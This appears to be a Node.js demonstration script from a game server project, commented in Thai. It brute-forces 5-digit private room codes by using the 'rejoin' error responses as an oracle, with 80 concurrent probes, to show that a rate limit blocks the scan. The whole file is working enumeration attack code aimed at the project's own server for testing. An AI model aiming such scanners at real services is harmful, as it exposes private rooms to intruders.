// สาธิตการโจมตีที่ 2 — ไล่เดารหัสห้อง 5 หลักจนเจอห้อง Private
//
// แนวคิด: รหัสห้องมีแค่ 90,000 ค่า (10000–99999) ผู้โจมตีไล่ยิงทีละรหัสได้
// ใช้ event `rejoin` เป็น "ออราเคิล": ตอบ NOT_IN_ROOM = ห้องนี้มีจริง (แต่เราไม่ใช่สมาชิก)
//                                      ตอบ ROOM_NOT_FOUND = ไม่มีห้องนี้
// จึงรู้ได้ว่าห้อง Private ไหน "มีอยู่" โดยไม่ต้องรู้รหัสล่วงหน้า = ข้อมูลรั่ว
// ถ้า server ไม่จำกัดความถี่ จะสแกนได้หลายพันรหัสต่อวินาที
// หลังใส่ rate limit ที่ join_room/rejoin การสแกนจะถูกบล็อกหลังลองไม่กี่ครั้ง
//
// วิธีรัน:  (เปิด server ไว้ก่อน)
//   cd server && node demo-attacks/attack-room-scan.js
const { connect, emitAck, sleep, randKey, TARGET } = require("./_lib");

const CONCURRENCY = 80; // ยิงพร้อมกันหลายคำขอ ให้เห็นความเร็วจริงของการสแกน
const MAX_PROBES = 90000; // เพดานกันสคริปต์วนไม่จบ (ถ้าไม่โดนบล็อกและหาไม่เจอ)

async function main() {
  console.log("══════════════════════════════════════════════════════════");
  console.log(" การโจมตีที่ 2: ไล่เดารหัสห้อง 5 หลักหาห้อง Private");
  console.log("══════════════════════════════════════════════════════════");
  console.log(`เป้าหมาย: ${TARGET}  ·  พื้นที่รหัส: 10000–99999 (90,000 ค่า)\n`);

  // เหยื่อสร้างห้อง Private ไว้หนึ่งห้อง (ไม่บอกรหัสให้ผู้โจมตี)
  const victim = await connect(randKey());
  const made = await emitAck(victim, "create_room", { name: "เหยื่อ", avatar: 0, visibility: "private" });
  if (!made?.ok) throw new Error("สร้างห้องเหยื่อไม่สำเร็จ");
  const target = made.code;
  console.log(`(เหยื่อสร้างห้อง Private รหัสลับ = ${target} — ผู้โจมตีไม่รู้รหัสนี้)\n`);

  // ผู้โจมตีเริ่มสแกน: ไล่รหัสจากจุดสุ่มแล้ววนรอบ ครอบคลุมทั้งพื้นที่
  const attacker = await connect(randKey());
  const startCode = 10000 + Math.floor(Math.random() * 90000);
  let probes = 0;
  let found = null;
  let blocked = false;
  const codeAt = (i) => String(10000 + ((startCode - 10000 + i) % 90000));

  let nextIndex = 0;
  async function worker() {
    while (!found && !blocked && nextIndex < MAX_PROBES) {
      const code = codeAt(nextIndex++);
      probes++;
      const res = await emitAck(attacker, "rejoin", { code });
      if (res?.error === "TOO_MANY_ATTEMPTS") { blocked = true; return; }
      // NOT_IN_ROOM = ห้องมีจริง (ข้อมูลรั่ว) · ไม่นับ ROOM_NOT_FOUND
      if (res && res.error !== "ROOM_NOT_FOUND") { found = code; return; }
    }
  }

  const start = Date.now();
  await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  const elapsed = ((Date.now() - start) / 1000).toFixed(2);
  const rate = probes > 0 ? Math.round(probes / Math.max(0.001, (Date.now() - start) / 1000)) : 0;

  console.log(`ผลลัพธ์:`);
  console.log(`  ลองไป          : ${probes} รหัส`);
  console.log(`  ใช้เวลา         : ${elapsed} วินาที  (~${rate} รหัส/วินาที)`);
  if (blocked) {
    console.log(`  สถานะ          : ⛔ ถูกบล็อก (server ตอบ TOO_MANY_ATTEMPTS)`);
    console.log(`  หาเจอหรือไม่   : ${found ? "เจอ" : "❌ ยังไม่เจอ ก็ถูกบล็อกก่อน"}`);
    console.log(`  → สรุป: การสแกนถูกจำกัดความถี่ ไล่เดารหัสทั้งหมดไม่ได้`);
  } else if (found) {
    console.log(`  สถานะ          : 🔓 เจอห้อง Private`);
    console.log(`  รหัสที่เจอ      : ${found}  (ตรงกับห้องของเหยื่อ: ${found === target ? "ใช่ ✅" : "ไม่ใช่"})`);
    console.log(`  → สรุป: ผู้โจมตีค้นเจอห้อง Private ได้โดยไม่รู้รหัสล่วงหน้า (ข้อมูลรั่ว)`);
  } else {
    console.log(`  สถานะ          : หาไม่เจอในเพดานที่ตั้งไว้ (ไม่ถูกบล็อก)`);
  }

  victim.disconnect();
  attacker.disconnect();
  await sleep(100);
  process.exit(0);
}

main().catch((e) => { console.error("สคริปต์ผิดพลาด:", e.message); process.exit(1); });
